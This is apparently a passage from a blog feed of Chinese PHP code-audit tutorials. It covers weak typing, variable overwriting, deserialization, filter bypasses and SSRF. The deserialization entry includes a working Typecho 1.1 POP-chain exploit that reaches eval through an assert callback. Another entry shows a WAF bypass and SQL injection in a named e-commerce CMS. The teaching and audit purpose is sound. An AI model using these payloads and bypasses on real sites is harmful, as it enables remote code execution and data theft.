文末</h1><p>当然逻辑漏洞不止就这些，还有其他的问题比如验证码逻辑的绕过，函数的缺陷，推荐大家多看看别人的审计文章。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>函数或弱类型的缺陷和特性</title>
      <link href="/2020/040126401.html"/>
      <url>/2020/040126401.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文章来自 公众号：404安全</p><h1 id="0x00-in-array"><a href="#0x00-in-array" class="headerlink" title="0x00  in_array()"></a>0x00  in_array()</h1><p><code>in_array(search,array,type)</code> 如果给定的值 search 存在于数组 array 中则返回 true。如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。如果没有在数组中找到参数，函数返回 false。 </p><p>那么为什么会出现安全问题呢，我们来看看下面代码</p><p><img src="./img/1.7.1.png" alt="file"></p><p>在没设置第三个参数的情况下<code>in_array()</code>函数将会吧<code>1 and 1=1</code>转为数字1比较，那么这样就造成了一些安全问题，在注入或上传的情况下可能绕过。</p><h1 id="0x01-is-number"><a href="#0x01-is-number" class="headerlink" title="0x01 is_number()"></a>0x01 is_number()</h1><p><code>is_number()</code> 函数他会判断变量是否为数字或者数字字符串，假如我们传入的字符串为16进制，那么他也是认定为数字的。</p><p><img src="./img/1.7.2.png" alt="file"></p><p>我们知道我们向mysql插入数据的时候是可以是16进制的，他取出来就会还原成原始字符串，这样用<code>is_number()</code> 函数检测后肯能就会存在二次注入。</p><h1 id="0x02-PHP弱类型的特性"><a href="#0x02-PHP弱类型的特性" class="headerlink" title="0x02 PHP弱类型的特性"></a>0x02 PHP弱类型的特性</h1><p>php是一款弱类型语言，他在使用==比较字符串的时候会把字符串类型转化成相同的再比较，那么这样也会造成一些问题.</p><p><img src="./img/1.7.3.png" alt="file"></p><p>他能遇到字符串的0e,0x就会解析成对应的科学计数和16进制。</p><h1 id="0x03-switch"><a href="#0x03-switch" class="headerlink" title="0x03 switch()"></a>0x03 switch()</h1><p>case是数字类型时，switch会把参数转换为int类型</p><p><img src="./img/1.7.4.png" alt="file"></p><h1 id="0x04-strcmp"><a href="#0x04-strcmp" class="headerlink" title="0x04 strcmp()"></a>0x04 strcmp()</h1><p>比较函数如果两者相等返回0，string1&gt;string2返回&gt;0 反之小于0。在5.3及以后的php版本中，当strcmp()括号内是一个数组与字符串比较时，也会返回0。</p><p><img src="./img/1.7.5.png" alt="file"></p><h1 id="0x05-preg-match"><a href="#0x05-preg-match" class="headerlink" title="0x05 preg_match()"></a>0x05 preg_match()</h1><p>如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题。</p><p><img src="./img/1.7.6.png" alt="file"></p><h1 id="0x06-文末"><a href="#0x06-文末" class="headerlink" title="0x06 文末"></a>0x06 文末</h1><p>当然还有反序列化、变量覆盖等等，这里就不全部写了，我会单独拿出来写，还有一些函数的特性留给大家自行搜索。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖审计</title>
      <link href="/2020/040126401.html"/>
      <url>/2020/040126401.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>变量覆盖，顾名思义就是可以覆盖已有变量值，导致变量覆盖的漏洞有：<code>extract()</code>、<code>parse_str()</code>、<code>import_request_variables()</code> 使用不当，或者使用了<code>$$</code>或者开启了全局变量注册。</p><h1 id="0x01-变量覆盖演示"><a href="#0x01-变量覆盖演示" class="headerlink" title="0x01 变量覆盖演示"></a>0x01 变量覆盖演示</h1><p><strong>extract()</strong></p><p><code>extract(array,extract_rules,prefix)</code><br>函数从数组中将变量导入到当前的符号表，即将数组中的键值对注册成函数，使用数组键名作为变量名，使用数组键值作为变量值。</p><p><img src="./img/1.8.1.png" alt="file"></p><p>可以看到我们初始变量值为a但是覆盖之后就变成了我们输入的值。</p><p><strong>parse_str()</strong></p><p><code>parse_str()</code>函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。在没有array参数的情况下使用此函数，并且在PHP 7.2中将废弃不设置参数的行为,此函数没有返回值。</p><p><img src="./img/1.8.2.png" alt="file"></p><p><strong>import_request_variables()</strong></p><p><code>import_request_variables ( string $types , string $prefix )</code><br>将 GET／POST／Cookie 变量导入到全局作用域中, types 参数指定需要导入的变量, G代表GET，P代表POST，C代表COOKIE。此函数只能用于PHP4.1 ~ PHP5.4。</p><p><img src="./img/1.8.3.png" alt="file"></p><p><strong>$$</strong></p><p>典型的例子就是foreach来遍历数组中的值作为变量。</p><p><img src="./img/1.8.4.png" alt="file"></p><p>其中<code>$_key</code>的值为a,那么 <code>$a</code>的值就被覆盖为2了。</p><p>还有全局注册register_globals这些，php配置默认都是关闭的。</p><h1 id="0x02-实战审计"><a href="#0x02-实战审计" class="headerlink" title="0x02 实战审计"></a>0x02 实战审计</h1><p>本次用到的是MetInfo cms的变量覆盖漏洞，跟进主页来到核心配置文件</p><p>\include\common.inc.php</p><p><img src="./img/1.8.5.png" alt="file"></p><p>看到文件的24~28行，明显用到了我们上面说的&amp;&amp;变量覆盖的写法，不过这里他用到了<code>daddslashes()</code>防注入，不过并不影响我们这章讲的知识。</p><p>随便来到一个子文件看看他的加载方式\news\index.php</p><p><img src="./img/1.8.6.png" alt="file"></p><p>第7行包含一个变量，那么这个变量在什么地方，我们跟进 include/module.php 看看，在本文件搜索<code>$module</code>变量。</p><p><img src="./img/1.8.7.png" alt="file"></p><p>这里其实低版本的源码中没有这句话<code>$module = &#39;&#39;;</code> 其中<code>$module</code>变量都在<code>$fmodule != 7</code> 这个if条件中，我给大家打包的是低版本，我安装错了。 也就是只要我们传入的<code>$fmodule</code>的值为7那么我们就可以覆盖这个<code>$module</code>的值</p><p><img src="./img/1.8.8.png" alt="file"></p><p>只要上传一张图片或者其他文件就可以包含了，因为<code>require_once</code>的时候并没有判断他的后缀名。</p><p>在变量覆盖的时候一定要注意初始化的值和覆盖的顺序。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列化审计</title>
      <link href="/2020/040126401.html"/>
      <url>/2020/040126401.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全<br>PHP反序列化漏洞，在我们使用<code>unserialize()</code>进行反序列化的时候，如果反序列化对象中存在一些我们可以利用的魔法函数且传入的变量可控，那么这个过程就可能触发这个魔法函数，来执行我们想要的过程。</p><h1 id="0x01-初识反序列化"><a href="#0x01-初识反序列化" class="headerlink" title="0x01 初识反序列化"></a>0x01 初识反序列化</h1><p>反序列化我们需要了解php的类和魔术方法，这里举个简单的例子用到的魔术方法是<code>__destruct</code> 销毁一个类之前执行执行析构方法。</p><p><img src="./img/1.9.1.png" alt="file"></p><p>当对象创建后输出我们的<code>$a</code>变量的值。那么我们把它的值改变后用<code>serialize()</code>看看</p><p><img src="./img/1.9.2.png" alt="file"></p><p><code>O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:5:&quot;12345&quot;;}</code> 是我们序列化的值，然后<code>unserialize($_GET[&#39;id&#39;]);</code>传入我们改变的值 <code>O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;404&quot;;}</code> 成功打印了我们的改变的值，因为反序列化我们可以控制类属性且这个过程会触发这些能够触发的魔术方法。</p><p>这里网上可以找到一些魔术方法,当然还有些可以绕过具体大家搜索一下我这里就不细写了，具体情况具体分析，反序列化难一点的还是需要很大的耐心才能完成。</p><pre><code>__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><h1 id="0x02-简单的一道题"><a href="#0x02-简单的一道题" class="headerlink" title="0x02 简单的一道题"></a>0x02 简单的一道题</h1><p>下面我改了写一道简单的CTF，看看怎么利用它。</p><pre><code>&lt;?phpclass foo1{    public $varr;    function __destruct(){        $this-&gt;varr-&gt;evaltest();    }}class foo2{    public $str;    function evaltest(){        eval($this-&gt;str);    }}?&gt;</code></pre><p>我们看到在foo2中<code>evaltest()</code>函数中存在eval，而foo1中调用了函数<code>evaltest()</code>，我们就想可不可以让foo1调用foo2中的<code>evaltest()</code>函数顺边还把它的<code>$str</code>中的值改写了。</p><pre><code>&lt;?phpclass foo1{    public $varr;    function __construct(){        $this-&gt;varr = new foo2();    }}class foo2{    public $str;    function __construct(){        $this-&gt;str = &#39;phpinfo();&#39;;  }}$obj = new foo1();echo serialize($obj); ?&gt;</code></pre><p>我们把<code>$varr</code>变量赋值为<code>new foo2()</code> 然后它再去调用 <code>evaltest()</code>函数 然后我们把<code>$str</code>的值换成 我们想执行的命令。</p><p><img src="./img/1.9.3.png" alt="file"></p><h1 id="0x03-实例审计"><a href="#0x03-实例审计" class="headerlink" title="0x03 实例审计"></a>0x03 实例审计</h1><p>找了半天源码我觉得最有意义的，审计的最多的一次反序列化当属Typecho1.1版本的漏洞了。可能看起来有点吃力我尽量分析的详细一点。</p><p>来到文件 <code>install.php</code></p><p><img src="./img/1.9.4.png" alt="file"></p><p>我们看到要绕过<code>install.php</code>这个程序的<code>exit</code> 我们只需要传入的<code>finish</code>值不为空且<code>referer</code>为本站的值就能绕过。</p><p>我们来到核心部分</p><p><img src="./img/1.9.5.png" alt="file"></p><p>这里调用<code>Typecho_Cookie</code>类的<code>get</code>方法 ，我这里就不跟进去了，就是获取cookies的<code>__typecho_config</code> 字段值，然后<code>base64_decode()</code>在进行反序例化赋值给变量<code>$config</code>,然后我们全局搜索下魔术方法<code>__destruct</code>之类的发现没有可以利用的点.</p><p><img src="./img/1.9.7.png" alt="file"></p><p>然后我们跟进这个<code>Typecho_Db</code>类看看，他传入了<code>$config[&#39;adapter&#39;]</code> 和 <code>$config[&#39;prefix&#39;]</code>。</p><p>var\Typecho\Db.php</p><p><img src="./img/1.9.6.png" alt="file"></p><p>这里使用<code>.</code>连接<code>$adapterName</code>为一个类的话那么会触发<code>__toString()</code>这个魔术方法。</p><p><img src="./img/1.9.8.png" alt="file"></p><p>然后全局搜索<code>__toString()</code>,来看看那里可以利，找到<code>\var\Typecho\Feed.php</code>。</p><p><img src="./img/1.9.9.png" alt="file"></p><p>如果<code>$item[&#39;author&#39;]</code>是一个类且<code>screenName</code>是一个私有或者未定义的属性那么就会自动触发<code>__get()</code></p><p><img src="./img/1.9.10.png" alt="file"></p><p>那么我们就搜索看看那里有可以利用的<code>__get()</code></p><p>在var\Typecho\Request.php 有这么一处</p><p><img src="./img/1.9.11.png" alt="file"></p><p>我把跟进的代码都放在了一块，其中__get 调用了 <code>get()</code>函数，然后它又调用了<code>_applyFilter()</code>函数，其中还有可以造成命令执行的回调函数<code>call_user_func()</code>和<code>array_map()</code> 其中参数还可以控制，那么我的攻击链也算找完了，下面来梳理一下</p><p>攻击链：</p><pre><code>install.php        |绕过程序退出来到unserialize()        |db.php中__construct() 触发__toString()        |Feed.php中__toString触发__get()        |request.php中__get()调用get()-&gt;_applyFilter()-&gt;回调函数</code></pre><p>下面来构造exp，为了方便理解我们可以从尾到头来写</p><p>首先我们需要<code>_applyFilter</code>中的<code>$filter</code>的值为一个命令函数这里一般选择<code>assert()</code>,然后要让<code>get()</code>中的<code>$value</code>就是我们传入的命令也就是<code>_params[&#39;screenName&#39;]</code>，所以可以构造如下。</p><pre><code>class Typecho_Request{    private $_params = array(&#39;screenName&#39; =&gt;&#39;eval(\&#39;phpinfo();exit();\&#39;)&#39;);    private $_filter = array(&#39;assert&#39;);}</code></pre><p><code>request.php</code>构造完了再构造<code>Feed.php</code>中需要的值,这里我们要进入<code>$item[&#39;author&#39;]-&gt;screenName</code>这个前面有个<code>self::RSS2 == $this-&gt;_type</code>语句 RSS2= RSS 2.0所以赋值对应的，这里的调用跟我前面写的那个CTF类似。</p><pre><code>class  Typecho_Feed{       private $_type = &#39;RSS 2.0&#39;;    private $_items ;       public function __construct (){        $this-&gt;_items[] = array(&#39;author&#39; =&gt; new Typecho_Request());    }}</code></pre><p>最后回到<code>install.php中</code> 看到<code>$db = new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);</code> 触发<code>db.php</code>中的<code>__construct()</code>需要传入2个值，但是有个是默认的所以我们传入一个我们序列化的上面的值就可以了。</p><p>payload :</p><pre><code>&lt;?phpclass Typecho_Request{    private $_params = array(&#39;screenName&#39; =&gt;&#39;eval(\&#39;phpinfo();exit();\&#39;)&#39;);    private $_filter = array(&#39;assert&#39;);}class  Typecho_Feed{       private $_type = &#39;RSS 2.0&#39;;    private $_items ;       public function __construct (){        $this-&gt;_items[] = array(&#39;author&#39; =&gt; new Typecho_Request());    }}$payload = array(&#39;adapter&#39;=&gt;new Typecho_Feed());echo base64_encode(serialize($payload));?&gt;</code></pre><p>为什么这里payload <code>phpinfo();exit();</code>中有<code>exit()</code> ,因为程序开始使用了<code>ob_start()</code> 这个函数会把输出放进缓冲区，触发异常后<code>ob_end_clean()</code> 会清空缓冲区，导致没有回显。所以可以找到个函数来跳出或者执行后我们报错跳出又或者直接不要回显写入一句话。</p><p><img src="./img/1.9.12.png" alt="file"></p><p>这类反序列化一般寻找起来还是很有难度的，个人感觉两头向中间来找方便一些，找到可以利用的入口，再到可以利用的函数，再从入口点想办法到利用点。</p><h1 id="0x04-文末"><a href="#0x04-文末" class="headerlink" title="0x04 文末"></a>0x04 文末</h1><p>反序列化的地方还可以搭配注入 比如espcms的search.php注入。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通读全文审计</title>
      <link href="/2020/040126401.html"/>
      <url>/2020/040126401.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>通读全文推荐大家开始可以审计一些比较好看懂的CMS，我们先看大体网站框架，这里你大概知道什么文件夹是放什么类型的文件，然后从<code>index.php</code>文件开始往里面读,然后重点关注是否有全局过滤等等。</p><h1 id="0x01-实例审计"><a href="#0x01-实例审计" class="headerlink" title="0x01 实例审计"></a>0x01 实例审计</h1><p>本文用到的源码是zzzphp，我们通过这个程序粗略的了解如何通读全文代码来审计，这里只做简单分析，不深入审计。</p><h2 id="了解网站框架"><a href="#了解网站框架" class="headerlink" title="了解网站框架"></a>了解网站框架</h2><pre><code>├─admin             //后台├─config            //配置文件├─form              //前台├─images            //图片├─inc               //包含文件├─install           //安装文件├─js                //js文件├─plugins           //插件├─runtime           //临时├─search            //搜索├─template          //模板├─upload            //上传文件夹└─wap               //手机</code></pre><p>首先我们看到这个结构，有一点审计基础或者会点英语应该都能看懂这些目录的意思，当然也有个别程序猿喜欢另类一点的命名规则，大体都是这样。</p><h2 id="了解网站过滤与路由"><a href="#了解网站过滤与路由" class="headerlink" title="了解网站过滤与路由"></a>了解网站过滤与路由</h2><p>我觉得全文通读不是无脑的去挨着读，这样比较浪费时间，我们一般应该先去读他的核心文件，一般都在包含文件夹里面，怎么去找核心文件一般是看文件名比如包含<code>main</code> <code>common</code>等等，也可以看看文件大小一般核心文件包含函数多文件相对较大，还可以通过入口文件一步一步去看，比如这里的核心文件就是<code>zzz_main.php</code>我们无非是先关注参数的获取、是否有全局过滤。</p><p>我们来到 <code>\inc\zzz_main.php</code></p><p><code>getlocation()</code> 解析URL</p><p><img src="./img/2.0.0.png" alt="file"></p><p><code>getform()</code>获取参数</p><p><img src="./img/2.0.1.png" alt="file"></p><p>过滤函数<code>txt_html()</code> 但是通常有关过滤的函数包含一些字符<code>safe</code>之类 或者包含函数 <code>htmlspecialchars()</code> <code>addslashes()</code></p><p><img src="./img/2.0.2.png" alt="file"></p><h2 id="了解系统DB类"><a href="#了解系统DB类" class="headerlink" title="了解系统DB类"></a>了解系统DB类</h2><p>除了这个文件我们还可以看看<code>mysql</code> <code>db</code> 之类的关键词文件，看看他数据库连接的方式是否存在宽字节注入的可能，还有他的连接方式。</p><p><img src="./img/2.0.6.png" alt="file"></p><h2 id="开始审计"><a href="#开始审计" class="headerlink" title="开始审计"></a>开始审计</h2><p>看完这些我们就可以从<code>index.php</code>一层一层读了。</p><p>来到 <code>index.php</code> 直接包含文件<code>inc/zzz_client.php</code> 先判断<code>isinstall</code> 然后执行后面</p><p><img src="./img/2.0.3.png" alt="file"></p><p>看到最后一句<code>ParseGlobal(G(&#39;sid&#39;),G(&#39;cid&#39;));</code> 这里调用了<code>ParseGlobal()</code> 函数我们可以跟进去看看。</p><p>进入if分支</p><pre><code>if ( $sid &gt; 0 ) {    $data = db_load_one( &#39;sort&#39;, &#39;sid=&#39; . $sid );</code></pre><p>跟进函数<code>db_load_one()</code> 这里会把传入的&amp;替换为and</p><p><img src="./img/2.0.4.png" alt="file"></p><p>跟进函数 <code>find_one()</code></p><p><img src="./img/2.0.5.png" alt="file"></p><p>这里我就不详细跟了只介绍思路，基本上确定这里如果传入的参数没过滤那么这里就会存在注入。</p><p>这里跟一下 <code>G()</code> 就会发现是<code>$GLOBALS[ &#39;sid&#39; ]</code> 获取的，也就是前面解析url那里获取的值也没有过滤，那么这里基本上就是一个注入了。</p><p>读完这些文件我们就可以从各个功能文件夹的index读进去，比如这里我们来到<code>\search\index.php</code></p><pre><code>&lt;?phpdefine(&#39;LOCATION&#39;, &#39;search&#39;);require dirname(dirname(__FILE__)). &#39;/inc/zzz_client.php&#39;;</code></pre><p>还是回到刚刚我们跟进的文件 <code>/inc/zzz_client.php</code> 搜索<code>search</code>关键词然后读源码分析</p><pre><code>    case &#39;search&#39;:         $tplfile= TPL_DIR . &#39;search.html&#39;;         break;</code></pre><p>看到选中<code>Search</code>后赋值给了变量<code>$tplfile</code> 然后我们在追踪变量在那个地方被调用过</p><p><img src="./img/2.0.7.png" alt="file"></p><p>发现他解析模板的过程，然后跟进<code>ParserTemplate</code> 来到<code>inc\zzz_template.php</code> 然后往下面读发现一个函数<code>getform()</code></p><p><img src="./img/2.0.8.png" alt="file"></p><p><code>getform()</code>函数获取过滤之后还被被 <code>safe_key()</code> 函数过滤，但是看到下面还有函数<code>get_cookie</code> 看样子也是获取参数的，但是这个用到函数<code>isset()</code> 他是一个检测变量的函数，定义了即为true 所以这里根本进不去，不然就是一个注入了,当然这也是一个老版本的注入，我这里的版本已经修复了。接下来还可以从<code>admin</code>的<code>index.php</code>开始读，多关注一些功能点，推荐可以搭建起来熟悉一下整套程序。</p><h1 id="0x02-文末"><a href="#0x02-文末" class="headerlink" title="0x02 文末"></a>0x02 文末</h1><p>通读这个ZZZCMS 我们可以知道，他在调用<code>getform()</code>函数的时候我们基本不考虑注入了，因为已经被过滤了，除非他后面用其他函数处理了一下。在调试复杂语句的时候我们可以通过mysql监控软件来调试。当我们发现一类函数或者写法存在漏洞的时候，可以使用全文搜索，来查找相同的代码对一类进行完整挖掘。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>过滤逻辑错误审计</title>
      <link href="/2020/040126401.html"/>
      <url>/2020/040126401.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>本文审计的系统为云ec电商系统版本1.2.3，网上也有审计文章这里主要是讲讲，有些程序可能本身他的过滤代码还是比较不错，但是逻辑问题造成了过滤函数没有起作用。</p><h1 id="0x01-实例审计"><a href="#0x01-实例审计" class="headerlink" title="0x01 实例审计"></a>0x01 实例审计</h1><p>还是先从index.php文件看进去吧！</p><pre><code>&lt;?phpdefine(&#39;in_mx&#39;, TRUE);$ym_version=&#39;1.2.3&#39;;$p=isset($_GET[&#39;p&#39;]) ? addslashes($_GET[&#39;p&#39;]) : &#39;&#39;;$p=(trim($p)==&#39;&#39;) ? &#39;index&#39; : trim($p);require(&quot;./inc/function/global.php&quot;);switch ($p){    case &#39;admin&#39;:        include(&quot;./inc/function/global_admin&quot;.Ext);        exit();    break;    case &#39;install&#39;:        require(&quot;./install/index&quot;.Ext);        exit();    break;    default:        if(strpos($p, &quot;n-&quot;)===0 || $ym_url_path[0] === &#39;news&#39;){            include(&quot;./inc/function/global_news&quot;.Ext);        }        else{            include(&quot;./inc/function/global_page&quot;.Ext);        }    break;}?&gt;</code></pre><p>从index.php来看是GET获取P参数然后引用对应的文件，先来看看/inc/function/global.php</p><pre><code>set_error_handler(&quot;customError&quot;,E_ERROR);$getfilter=&quot;\\b(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;$postfilter=&quot;\\b(and|or)\\b.{1,6}?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;$cookiefilter=&quot;\\b(and|or)\\b.{1,6}?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;function StopAttack($StrFiltKey,$StrFiltValue,$ArrFiltReq){      if(is_array($StrFiltValue))    {        $StrFiltValue=implode($StrFiltValue);    }            if (preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;,urldecode($StrFiltValue))){            print &quot;网址有误~&quot;;            exit();    }      }  foreach($_GET as $key=&gt;$value){    StopAttack($key,$value,$getfilter);}if ($_GET[&quot;p&quot;]!==&#39;admin&#39;){    foreach($_POST as $key=&gt;$value){         StopAttack($key,$value,$postfilter);    }}foreach($_COOKIE as $key=&gt;$value){     StopAttack($key,$value,$cookiefilter);}unset($_GET[&#39;_SESSION&#39;]);unset($_POST[&#39;_SESSION&#39;]);unset($_COOKIE[&#39;_SESSION&#39;]);</code></pre><p>这个正则貌似就是copy的360webscan的那个，这里GET、POST、COOKIE都被过滤了的，但是我们看到其中过滤POST的判断</p><pre><code>if ($_GET[&quot;p&quot;]!==&#39;admin&#39;){    foreach($_POST as $key=&gt;$value){         StopAttack($key,$value,$postfilter);    }}</code></pre><p>如果GET传入的p=admin了就不会进入这个if语句，也达到我们绕过的目的了，然后往下面看</p><pre><code>if (!empty($_GET)){ foreach($_GET AS $key =&gt; $value) $$key = addslashes_yec($value); }if (!empty($_POST)){ foreach($_POST AS $key =&gt; $value) $$key = addslashes_yec($value); }</code></pre><p>这里我们传入的P参数的值被重新覆盖掉，然后经过<code>addslashes_yec</code>函数过滤。然后我们梳理一下审计思路</p><pre><code>1. 寻找SERVER获取的。2. 寻找数字型注入，结合上面的绕过，注入密码。</code></pre><p>先看看前台注入，这个cms注入比较多，我就随便写个了</p><p>\inc\module\cart.php</p><pre><code>    elseif ($act == &#39;remove_goods&#39;) //移除商品    {                $ckey = $ckey ? intval($ckey) : intval($_COOKIE[&#39;ckey&#39;]);        $gid_list = explode(&quot;@&quot;, $gid);        $spec_list = explode(&quot;@&quot;, $spec);        $db = dbc();        $where =&#39;&#39;;        if($ckey != 0)        {            $where =&#39; and cid=&#39;.$ckey;        }        elseif($ym_uid !=0)        {            $where =&#39; and uid=&#39;.$ym_uid;        }        else {            $res[&#39;err&#39;] = &#39;请刷新页面再试&#39;;            die(json_encode_yec($res));        }        foreach ($gid_list as $k =&gt; $v) {            $sp = $spec_list[$k];            if(intval($v)&lt;=0)            {                continue;            }                        $db-&gt;query(&quot;delete i FROM &quot;.$db-&gt;table(&#39;cart&#39;).&quot; c join &quot;.$db-&gt;table(&#39;cart_item&#39;).&quot; i on c.id=i.cid where gid=&quot;.$v.&quot; and spec=&#39;&quot;.$sp.&quot;&#39; &quot;.$where);        }        $cnum = get_cart_amount(1);        $res[&#39;res&#39;] = $cnum;        $time = time() + 15552000;                        set_cookie(&#39;cnum&#39;,  $cnum, $time); //购物车数量        die(json_encode_yec($res));    }    </code></pre><p>其中传入的$gid经过<code>explode</code>函数分割（这里sql语句中不能使用@字符），然后foreach循环取出来后带入sql语句，也没有单双引号之类的包裹，比较明显的一处注入了。</p><p><img src="./img/2.1.0.png" alt="file"></p><p>如果没用绕过是会触发360webscan的</p><p><img src="./img/2.1.1.png" alt="file"></p><h1 id="0x02-文末"><a href="#0x02-文末" class="headerlink" title="0x02 文末"></a>0x02 文末</h1><p>这套程序在1.2.4这里修复了这个逻辑方面的问题貌似漏洞就没啥了。本版本还有很多注入大家可以自己审计一下，也可以看看水泡泡巨佬的<a href="https://www.cnblogs.com/r00tuser/p/9014869.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/9014869.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ssrf漏洞详解</title>
      <link href="/2020/032630644.html"/>
      <url>/2020/032630644.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-ssrf概述"><a href="#0x01-ssrf概述" class="headerlink" title="0x01. ssrf概述"></a>0x01. ssrf概述</h2><h5 id="1、SSRF漏洞概述"><a href="#1、SSRF漏洞概述" class="headerlink" title="1、SSRF漏洞概述"></a>1、SSRF漏洞概述</h5><p><code>SSRF(服务器端请求伪造)</code>： 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）<br><img src="https://img-blog.csdnimg.cn/20200326134731702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""></p><h5 id="2、SSRF漏洞产生原因"><a href="#2、SSRF漏洞产生原因" class="headerlink" title="2、SSRF漏洞产生原因"></a>2、SSRF漏洞产生原因</h5><p>SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p>如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p><h5 id="3-漏洞的产生"><a href="#3-漏洞的产生" class="headerlink" title="3.漏洞的产生"></a>3.漏洞的产生</h5><p>在PHP中的<code>curl()</code>，<code>file_get_contents()</code>，<code>fsockopen()</code> 等函数是几个主要产生ssrf漏洞的函数。</p><p><strong>1) curl()</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#curl_setopt($ch,CUPLOPT_HEADER,1);</span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><code>function</code> 定义一个函数，叫做curl，有一个参数，叫<code>$url</code><br><code>curl_init()</code>   初始化一个cURL会话后。将<code>$url</code>传入<code>curl_setopt($ch,CURLOPT_URL,$url);</code></p><blockquote><p><strong>（<code>curl_setopt($ch, CURLOPT_HEADER, 1)</code> 这边是设定返回信息信息，是否要返回响应信息头这里的话可以注释掉）</strong><br><img src="https://img-blog.csdnimg.cn/20200326131908813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" 